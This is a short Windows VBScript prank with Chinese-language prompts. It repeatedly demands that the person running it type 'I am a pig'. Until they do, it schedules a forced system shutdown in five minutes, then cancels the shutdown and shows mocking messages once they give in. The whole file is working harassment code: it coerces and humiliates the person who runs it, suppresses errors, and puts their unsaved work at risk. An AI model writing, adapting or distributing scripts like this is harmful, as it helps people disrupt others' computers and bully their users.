on error resume next
dim a
a = inputbox ("说我是猪，就放过你；否则立即关闭计算机。                                                     快说“我是猪”！","说不说","就是不说",4500,4000)
do while(a <> "我是猪")
dim Wsh
Set Wsh = WScript.CreateObject("WScript.Shell")
Wsh.run "shutdown -s -t 300 -c "&chr(34)&"计算机即将在5分钟内关闭，请保存好您的文件。若不想关机，请关闭本对话框，并在已打开的输入框内输入“我是猪”"&chr(34)
a = inputbox ("说我是猪,就不关机，快说“我是猪”！","说不说","我就是不说",4500,4000)
loop
Set ws=WScript.CreateObject("Wscript.Shell") 
ws.Run "shutdown -a",0
dim WSHshell
msgbox chr(13) + chr(13) + chr(13) + "终于承认了"
msgbox chr(13) + chr(13) + chr(13) + "早说就行了嘛"
msgbox chr(13) + chr(13) + chr(13) + "哈哈哈哈，真过瘾"